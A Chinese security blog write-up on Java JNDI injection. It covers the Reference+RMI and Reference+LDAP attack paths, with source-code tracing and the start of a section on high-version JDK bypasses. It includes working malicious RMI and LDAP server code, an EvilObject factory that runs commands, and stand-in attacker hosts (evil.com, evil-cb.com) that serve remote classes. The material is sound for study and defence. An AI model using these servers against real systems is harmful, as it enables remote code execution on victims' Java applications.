title="远程对象引用安全限制"></a>远程对象引用安全限制</h2><p>需要注意的是，在学习RMI时，RMI服务中远程对象将受到本地Java环境的限制，需要java.rmi.server.useCodebaseOnly配置必须为false，表示允许加载除了Classpath外的远程对象。</p><p>而在JNDI获取RMI服务中，被引用的远程工厂对象也将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，为false表示不信任远程对象引用，就不能调用远程的引用对象</p><ul><li><code>JDK5u45、JDK6u45、JDK7u21、JDK8u121</code>开始，<code>java.rmi.server.useCodebaseOnly</code>默认值改为了true。</li><li><code>JDK6u132、JDK7u122、JDK8u113</code>开始<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值改为了 false。</li></ul><p>可使用System.setProperty允许加载允许加载远程的引用对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure><p>同时LDAP也在<code>JDK6u211、7u201、8u191、11.0.1</code>后将<code>com.sun.jndi.ldap.object.trustURLCodebase</code>的默认设置为了false。（但不受<code>java.rmi.server.useCodebaseOnly</code>影响）</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>环境：jdk 8u65</p><p>原理就是由于动态协议转换的机制，当lookup方法访问的地址参数可控时，则可能导致加载恶意类，注意其恶意命令执行主要是通过远程引用Reference而不是反序列化</p><h3 id="Reference-RMI"><a href="#Reference-RMI" class="headerlink" title="Reference+RMI"></a>Reference+RMI</h3><h4 id="原理及利用"><a href="#原理及利用" class="headerlink" title="原理及利用"></a>原理及利用</h4><p>我们在攻击RMI客户端时，是通过准备一个恶意的远程对象，最后在客户端反序列化这个恶意对象造成攻击</p><p>而如果远程获取到RMI服务上的对象为Reference类或者其子类，则在客户端获取远程对象存根实例时，可以从其他服务器上加载class文件来实例化这个Stub对象，而JNDI注入就是利用这个特性来加载恶意类的</p><p>当客户端请求服务地址可控，就可以访问一个恶意的服务端，让这个恶意服务端绑定一个Reference对象这里我们使用ReferenceWrapper对象，这个对象对Reference类或其子类对象进行远程包装使其能够被远程访问</p><p>利用流程：</p><ol><li><p>攻击者通过可控的URL参数触发动态环境转换，例如URL为<code>rmi://evil.com:1099/refObj</code>，而客户端在使用lookup时原来的上下文环境<code>rmi://localhost:1099</code>会由于动态环境转换被指向<code>rmi://evil.com:1099/</code></p></li><li><p>恶意服务端先创建一个恶意引用，其中引用对象的类名，工厂类名都为我们的恶意远程对象，而工厂类的加载地址设为我们恶意远程对象的地址：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String refClassName=<span class="string">&quot;EvilObject&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">FactoryClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilObject&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">factoryLocation</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>;</span><br><span class="line">Reference reference=<span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName,FactoryClassName,factoryLocation);</span><br><span class="line">ReferenceWrapper refWrapper=<span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br></pre></td></tr></table></figure><p>然后去<code>rmi://evil.com:1099</code>恶意注册端上将准备的ReferenceWrapper对象与refObj对象绑定</p></li><li><p>当客户端查询<code>rmi://evil.com:1099/refObj</code>查找引用时，JNDI会解析服务端注册的Reference对象，这时客户端会开始从本地CLASSPATH搜索EvilObject类，如果不存在就会尝试从远程地址<code>http://127.0.0.1:8080/</code>上去获取EvilObject.class，即动态的去获取<code>http://evil-cb.com/EvilObject.class</code></p></li><li><p>客户端下载恶意远程对象字节码后会主动去加载该字节码调用EvilObject类的构造函数从而执行恶意代码</p></li></ol><p>EvilObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilServer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String refClassName=<span class="string">&quot;jndi.EvilObject&quot;</span>;    <span class="comment">//注意使用全限定名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">FactoryClassName</span> <span class="operator">=</span> <span class="string">&quot;jndi.EvilObject&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">factoryLocation</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:5432/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        Reference reference=<span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName,FactoryClassName,factoryLocation);</span><br><span class="line">        ReferenceWrapper refWrapper=<span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>,refWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;Server Started\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.RMIInterface;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String str=<span class="string">&quot;rmi://127.0.0.1:1099/b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先编译EvilObject：</p><p><img src="/archives/be65d471/image-20250717173800138.png" alt="image-20250717173800138"></p><p>然后运行恶意服务端，接着在含有EvilObject.class目录下启动http服务：</p><p><img src="/archives/be65d471/image-20250717173912224.png" alt="image-20250717173912224"></p><p>运行客户端：</p><p><img src="/archives/be65d471/image-20250717174231722.png" alt="image-20250717174231722"></p><p>成功弹出计算机，但存在报错：</p><p><img src="/archives/be65d471/image-20250717174406699.png" alt="image-20250717174406699"></p><p>似乎是类转换异常，JNDI 期望从远程获取一个<strong>实现了<code>ObjectFactory</code>接口的工厂类</strong>，但实际返回的是<code>jndi.EvilObject</code>类，而该类未实现<code>ObjectFactory</code>接口</p><p><img src="/archives/be65d471/image-20250717175446936.png" alt="image-20250717175446936"></p><p>在ObjectFactory接口定义了getObjectInstance方法，这是 <code>ObjectFactory</code> 接口的核心方法，当 JNDI 查找返回 <code>Reference</code> 对象时他会自动调用，或者触发<strong>RMI 查找</strong>、<strong>LDAP 查找</strong>、<strong>资源注入</strong>等时也会触发，所以修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250719193111559.png" alt="image-20250719193111559"></p><h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><p>跟一下源码便于自己理解，在RegistryContext.lookup方法开始：</p><p><img src="/archives/be65d471/image-20250720185023514.png" alt="image-20250720185023514"></p><p>这里通过Registry_Stub.lookup方法获取到ReferenceWrapper_Stub对象</p><p><img src="/archives/be65d471/image-20250720185123566.png" alt="image-20250720185123566"></p><p>接着调用decodeObject方法：<br><img src="/archives/be65d471/image-20250720185257424.png" alt="image-20250720185257424"></p><p>判断ReferenceWrapper_Stub是否是RemoteReference对象，这里直接调用getReference()方法：</p><p><img src="/archives/be65d471/image-20250720185632977.png" alt="image-20250720185632977"></p><p>调用UnicastRef.invoke建立连接，返回一个Reference对象</p><p>接着回到RegistryContext.decodeObject方法，随后调用NamingManager.getObjectInstance方法：</p><p><img src="/archives/be65d471/image-20250720190022720.png" alt="image-20250720190022720"></p><p>与上面动态协议转换调试的不同，这里的refInfo就是返回的Reference对象：<br><img src="/archives/be65d471/image-20250720190111829.png" alt="image-20250720190111829"></p><p>这里的ref变量不为空：<br><img src="/archives/be65d471/image-20250720190354552.png" alt="image-20250720190354552"></p><p>调用getObjectFactoryFromReference(ref, f)方法，根进下：</p><p><img src="/archives/be65d471/image-20250720190523882.png" alt="image-20250720190523882"></p><p>如果本地存在需要获取的类，则会使用在本地直接获取。如果本地不存在并且可以从远程获取到该类，则会远程加载类。获取到类之后，会在return返回语句中调用newInstance方法，会触发类的构造方法。</p><h3 id="Reference-LDAP"><a href="#Reference-LDAP" class="headerlink" title="Reference+LDAP"></a>Reference+LDAP</h3><h4 id="原理及利用-1"><a href="#原理及利用-1" class="headerlink" title="原理及利用"></a>原理及利用</h4><p>由于LDAP的存储形式支持存储JNDI Reference，其攻击原理和RMI是类似的旨在返回一个恶意的Reference对象给客户端，客户端根据codebase路径查找工厂加载恶意EvilObject.class</p><p>下载依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">6.0</span><span class="number">.11</span>&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>EvilServer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:5432/#EvilObject&quot;</span>&#125;;  <span class="comment">//恶意对象下载地址</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;  <span class="comment">//LDAP服务端口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置LDAP服务器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加恶意拦截器</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//启动服务</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;    <span class="comment">//恶意代码地址</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);  <span class="comment">//发送恶意响应</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="comment">// 构造 class 文件实际路径 (将 #EvilObject 转换为 /EvilObject.class)</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//任意类名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建恶意 LDAP 条目</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  <span class="comment">//代码库地址 (http://127.0.0.1:5432/)</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  <span class="comment">//工厂类名（EvilObject）</span></span><br><span class="line">            result.sendSearchEntry(e);  <span class="comment">//发送给客户端</span></span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1:5432</code>为指定的codebase，EvilObject为要查找的字节码路径，也就是从当前本地路径查找EvilObject.class文件</p><p>Client：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:9999/EvilObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">Context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Context.lookup(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250720204342149.png" alt="image-20250720204342149"></p><h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><p>进入InitialContext.lookup方法：<br><img src="/archives/be65d471/image-20250720215950132.png" alt="image-20250720215950132"></p><p>先进入getURLOrDefaultInitCtx方法，主要通过协议名获取对应的对象进行lookup：</p><p><img src="/archives/be65d471/image-20250720220048125.png" alt="image-20250720220048125"></p><p><img src="/archives/be65d471/image-20250720220101133.png" alt="image-20250720220101133"></p><p><img src="/archives/be65d471/image-20250720220210430.png" alt="image-20250720220210430"></p><p>然后回到主逻辑ldapURLContext.lookup方法中，跟进到PartialCompositeContext.lookup方法：</p><p><img src="/archives/be65d471/image-20250720221534275.png" alt="image-20250720221534275"></p><p>跟进LdapCtx.p_lookup方法，由于headTail.getStatus()为2：</p><p><img src="/archives/be65d471/image-20250720222133804.png" alt="image-20250720222133804"></p><p>跟进c_lookup方法:</p><p><img src="/archives/be65d471/image-20250720222233494.png" alt="image-20250720222233494"></p><p>attributes存放着LDAP的基本信息，由于没java文件所以直接用网上的图:<br><img src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F27af794e-306c-4b71-9ef4-5568c47630e0%252FUntitled.png" alt="img"></p><p>跟进decodeObject方法：</p><p><img src="/archives/be65d471/image-20250720222450165.png" alt="image-20250720222450165"></p><p>JAVA_ATTRIBUTES是一个数组：</p><p><img src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F8477c197-95cc-47fd-98e8-5e36cd0a462d%252FUntitled.png" alt="img"></p><p><img src="/archives/be65d471/image-20250720222834709.png" alt="image-20250720222834709"></p><p><code>var0.get(JAVA_ATTRIBUTES[0]);</code>：</p><p><img src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F3e3db4e6-ba83-43d7-8f35-6358a0c12e5c%252FUntitled.png" alt="img"></p><p>JAVA_OBJECT_CLASSES也是一个数组，表示在LDAP的存储的形式:</p><p><img src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F477f6bf6-2ae2-4b20-9566-148ff595f9d3%252FUntitled.png" alt="img"></p><p>最后会在decodeReference方法解码，传入javaReferenceAddress的相关信息:<br><img src="/archives/be65d471/image-20250720223026630.png" alt="image-20250720223026630"></p><p><img src="/archives/be65d471/image-20250720223130574.png" alt="image-20250720223130574"></p><p>获取javaClassName、工厂名和加载工厂地址，封装成一个Reference对象，最后是返回这个对象的</p><p>回到c_lookup方法:</p><p><img src="/archives/be65d471/image-20250720223245541.png" alt="image-20250720223245541"></p><p>var3就是返回的Reference对象</p><p>跟进DirectoryManager.getObjectInstance方法：</p><p><img src="/archives/be65d471/image-20250720223356883.png" alt="image-20250720223356883"></p><p>后面就和RMI是一样的了</p><h2 id="高版本限制绕过"><a href="#高版本限制绕过" class="headerlink" title="高版本限制绕过"></a>高版本限制绕过</h2><h3 id="JNDI-RMI-Reference限制"><a href="#JNDI-RMI-Reference限制" class="headerlink" title="JNDI_RMI_Reference限制"></a>JNDI_RMI_Reference限制</h3><p>在jdk 6u132，jdk 7u122，jdk 8u113之后Java限制了通过RMI远程加载Reference工厂类。com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类，在RegistryContext.decodeObject方法中多了一个对trustURLCodebase的判断，由于默认设置的原因，也就导致直接抛出了异常</p><p><img src="/archives/be65d471/image-20250721101359277.png" alt="image-20250721101359277"></p><h3 id="JNDI-LDAP-Reference限制"><a href="#JNDI-LDAP-Reference限制" class="headerlink" title="JNDI_LDAP_Reference限制"></a>JNDI_LDAP_Reference限制</h3><p>在JDK 11.0.1、8u191、7u201、6u211之后 